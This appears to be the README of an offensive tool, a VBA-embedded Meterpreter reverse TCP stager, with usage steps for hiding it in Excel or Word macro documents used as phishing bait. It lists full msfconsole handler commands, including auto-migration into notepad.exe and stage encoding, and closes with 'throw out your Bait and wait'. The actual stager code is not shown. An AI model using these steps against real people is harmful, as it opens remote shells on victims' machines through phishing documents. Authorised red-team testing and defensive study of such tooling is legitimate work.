```
   _____                                _____          __
  /     \ _____    ___________  ____   /     \   _____/  |_  ___________
 /  \ /  \\__  \ _/ ___\_  __ \/  _ \ /  \ /  \_/ __ \   __\/ __ \_  __ \
/    Y    \/ __ \\  \___|  | \(  <_> )    Y    \  ___/|  | \  ___/|  | \/
\____|__  (____  /\___  >__|   \____/\____|__  /\___  >__|  \___  >__|
        \/     \/     \/                     \/     \/          \/

                       Metasploit Big Game Phising Bait - by Cn33liz 2017
```
### VBA Reversed TCP Meterpreter Stager
CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
https://github.com/tyranid/DotNetToJScript

```
Usage:
Change RHOST and RPORT to suit your needs:

Then create an awesome Excel or Word Document containing your VBA Bait

Start Msfconsole:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 443
set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
set EXITFUNC thread
set EnableUnicodeEncoding true
set EnableStageEncoding true
set ExitOnSession false
exploit -j

Then throw out your Bait and wait...
```
